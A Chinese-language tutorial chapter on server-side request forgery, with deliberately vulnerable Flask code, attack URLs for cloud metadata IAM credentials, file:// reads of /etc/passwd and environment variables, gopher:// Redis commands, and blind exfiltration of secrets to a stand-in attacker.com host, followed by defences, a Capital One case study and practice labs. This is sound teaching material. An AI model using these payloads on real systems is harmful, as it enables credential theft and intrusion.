# Ch 15 — A10 SSRF (Server-Side Request Forgery)

> 目標：搞懂 SSRF 怎麼攻擊 cloud metadata / 內網 / blind SSRF，怎麼防。

## SSRF 是什麼

「**騙 server 對 attacker 指定的 URL 發 request**」。

vulnerable code：

```python
@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    response = requests.get(url)   # 拿 user 給的 URL
    return response.text
```

正常用法：取 `https://example.com/data.json`。

attacker：

```
?url=http://localhost/admin
?url=file:///etc/passwd
?url=http://169.254.169.254/latest/meta-data/   ← AWS metadata
```

## 為什麼 SSRF 危險

server 通常：

- 在內網能 access internal services
- 有 cloud credentials
- 跨 firewall

「**server-side**」攻擊讓 attacker 從 internet 跳到「**internal**」。

## 經典攻擊

### 1. Cloud metadata service

AWS / GCP / Azure 提供 metadata service 給 EC2 instance：

```
AWS:    http://169.254.169.254/latest/meta-data/
GCP:    http://metadata.google.internal/
Azure:  http://169.254.169.254/metadata/instance
```

任何 process（含 web server）能 access。**含 IAM credentials**！

```bash
# 在 EC2 instance 內部
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 拿到 IAM role name，然後：
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# 拿到 access key + secret + token
```

如果 web app 有 SSRF → attacker 從外部能 trigger 這 request → 拿到 IAM creds → access 整個 AWS account。

「**Capital One 2019 大 breach**」就是這個（再講後面）。

#### 防禦：IMDSv2

AWS 2019 推 Instance Metadata Service v2：

- 必先 PUT 拿 token
- token 有 hop limit（防 SSRF）
- 強制 header (`X-aws-ec2-metadata-token`)

新 EC2 該強制 IMDSv2：

```bash
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxx \
  --http-tokens required
```

### 2. 內網掃描

```
?url=http://192.168.1.1
?url=http://10.0.0.1:22
?url=http://internal-api.local
```

server 對 internal IP 發 request → response time / status code 告訴 attacker 哪些 IP / port 開。

進階：full port scan via SSRF。

### 3. 內部 service 攻擊

```
?url=http://localhost:6379/             ← Redis（沒 auth）
?url=http://localhost:9200/_cat/indices  ← Elasticsearch
?url=http://localhost:8080/manager/html  ← Tomcat manager
```

內部 service 通常沒設密碼（「反正只有內網能 access」）→ SSRF 把它變對外。

### 4. file:// scheme

```
?url=file:///etc/passwd
?url=file:///proc/self/environ    ← env vars
?url=file:///app/.env
```

讀本機檔案。看 library 是否支援 `file://`：

- Python `requests`: 不支援（好）
- Python `urllib`: 支援（壞）
- Java HttpURLConnection: 支援
- PHP `file_get_contents`: 支援

修：限制 scheme 為 `http(s)://`。

### 5. Gopher / Other schemes

```
?url=gopher://internal-redis:6379/_SET%20key%20value
```

`gopher://` 能送任意 byte → 跟任意 TCP service 互動（包括 Redis / Memcached / SMTP）。

```
?url=dict://internal:11211/STAT
?url=ftp://internal/
```

## Blind SSRF

server 不回 response，但你想知道 internal info。

### Out-of-band

讓 server 對 attacker controlled domain 發 request：

```
?url=http://attacker.com/?leak=
```

attacker DNS / web server 看 log → 確認 SSRF + 拿到 server IP。

進階：把資料 encode 在 DNS query：

```
?url=http://<base64-of-secret>.attacker.com/
```

attacker DNS log 看到 → decode 拿 secret。

### Time-based

```
?url=http://internal:3306    ← MySQL port，可能 hang
```

response time = 開 / 關。

## 防禦

### 1. 白名單 URL

```python
ALLOWED_DOMAINS = ['example.com', 'cdn.example.com']

def is_safe_url(url):
    parsed = urlparse(url)
    return parsed.scheme in ('http', 'https') and parsed.hostname in ALLOWED_DOMAINS
```

最安全。

### 2. Block private IP

```python
import ipaddress

def is_private(ip):
    addr = ipaddress.ip_address(ip)
    return addr.is_private or addr.is_loopback or addr.is_link_local

# Resolve hostname → IP → check
ip = socket.gethostbyname(hostname)
if is_private(ip):
    abort(400)
```

但要小心：

- DNS rebinding：DNS resolve 第一次回 public IP，第二次回 internal（race）
- Redirect：first request OK，redirect 到 internal
- IPv6 (`::1`, `fe80::`)
- 各種特殊位址（`169.254.169.254`, `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `0.0.0.0`）

完整 block 列表很長，**用 library**：

```python
# Python
import requests
from defusedxml import requests_safe   # （concept）

# 或：
import socket, ipaddress
def safe_get(url):
    parsed = urlparse(url)
    ip = socket.gethostbyname(parsed.hostname)
    if ipaddress.ip_address(ip).is_private:
        raise ValueError("Blocked")
    return requests.get(url, allow_redirects=False)   # 不 follow redirect
```

### 3. 限制 scheme

只允許 `http(s)://`，禁 `file://` / `gopher://` / `dict://` / 等。

### 4. Network segmentation

server 不該能 access metadata / internal sensitive service。

- VPC firewall block 169.254.169.254（除了 instance 自己 metadata access）
- 不必要 service 不開
- 用 IMDSv2

### 5. Out-of-band callback 偵測

部署 server 端 monitoring：對 unexpected outbound request 發 alert。

## 真實案例：Capital One（2019）

1.06 億 美國信用卡 customer 資料外洩，**SSRF 是主因**：

```
1. Capital One 用 ModSecurity WAF
2. WAF 配置 misconfig 有 SSRF
3. attacker 用 SSRF 對 EC2 metadata 發 request
4. 拿到 IAM role credentials
5. 用 IAM role access S3
6. 從 S3 download 1 億 customer 資料
```

關鍵：

- WAF 本身是 SSRF entry
- IMDSv1（沒 hop limit）→ SSRF 直接拿 token
- IAM role 過廣（讀整個 S3）

**4 個層級全部失誤** = 災難。教訓：defense in depth 真的重要。

修補：

- IMDSv2 mandatory
- WAF 配置嚴格 review
- IAM least privilege（只讀必要 bucket）
- VPC endpoint（讓 EC2 不需要走 metadata）

## 動手練習

**1. 寫 vulnerable SSRF + 攻**

```python
# vulnerable.py
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    return requests.get(url).text

if __name__ == '__main__':
    app.run(port=5000)
```

```bash
# 攻擊（在自己機器跑）
curl 'http://localhost:5000/fetch?url=http://localhost:5000/'   # 自己訪問自己
curl 'http://localhost:5000/fetch?url=file:///etc/passwd'        # 視 lib 而定
curl 'http://localhost:5000/fetch?url=http://169.254.169.254/'   # 在 EC2 上 → metadata
```

**2. 修 vulnerable**

```python
import socket, ipaddress
from urllib.parse import urlparse

def is_safe_url(url):
    parsed = urlparse(url)
    if parsed.scheme not in ('http', 'https'):
        return False
    try:
        ip = socket.gethostbyname(parsed.hostname)
        if ipaddress.ip_address(ip).is_private:
            return False
        return True
    except:
        return False

@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    if not is_safe_url(url):
        abort(400)
    return requests.get(url, allow_redirects=False).text
```

**3. Burp Collaborator**

Burp 內建「Collaborator」 — attacker controlled domain，能看 callback：

```
http://abc123.burpcollaborator.net/
```

在 SSRF 時送 server 這 URL，Burp 看 DNS / HTTP callback → 確認 SSRF。

**4. PortSwigger Academy SSRF**

https://portswigger.net/web-security/ssrf

完整 lab 含 blind SSRF / DNS rebinding。

**5. Juice Shop SSRF**

「Server-Side Request Forgery」challenge。

## 自我檢核

- [ ] SSRF 基本攻擊原理
- [ ] Cloud metadata 攻擊（特別 AWS）
- [ ] 4+ 種 SSRF 攻擊變形（內網 / file:// / gopher / blind）
- [ ] 知道 IMDSv2 為什麼重要
- [ ] 防禦：白名單 + private IP block + scheme 限制
- [ ] Capital One breach 流程清楚

Part 2 結束。下一個 Part 進主流工具。

→ [Ch 16 Burp Suite 完整](./16-burp-suite.md)
